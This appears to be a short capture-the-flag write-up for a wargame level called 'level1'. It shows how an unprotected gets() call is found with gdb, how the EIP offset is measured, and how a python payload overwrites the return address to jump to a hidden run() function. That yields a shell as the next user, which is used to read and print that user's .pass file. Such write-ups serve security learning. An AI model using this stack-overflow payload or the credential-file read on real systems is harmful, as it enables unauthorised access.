$ ./level1 
=> (Wait for an input)
$ dsahkjdhsf
=> dsahkjdhsf
=> (Close standard input)

I disas the main
$ gdb level1
$ (gdb) disas main
=>    0x08048490 <+16>:	call   0x8048340 <gets@plt>
There's an unprotected call to <gets>.
It appears that it segfault with 80character.

Now I needed a way to exploit it and found this :
$ objdump -d level1
=> 08048444 <run>

We can see that there's this function that is not called in the main but now that we can Overflow <gets>. we'll try to acceed to this function.
We'll proceed this way :
First we check the size of the buffer thanks to this kind of script
$ python -c 'print ("A"*70 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ")' > /tmp/payload
which will allow us to find out at what place in the string EIP is overwritten.

Then we fill the buffer with trash and add the address of the function <run> at the end. which will overwrite the current address of EIP (Instructional pointer register) and call <run>
$ python -c 'print ("A"*76 + "\x44\x84\x04\x08")' > /tmp/payload
$ cat /tmp/payload | ./level1
=> Good... Wait what?
=> Segfault

We add - to the cat to stay in the standard input, which will allow us to use the call to <system> we can find in the <run> function execute a cat as the user "level2"
$ cat /tmp/payload - | ./level1
=> Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77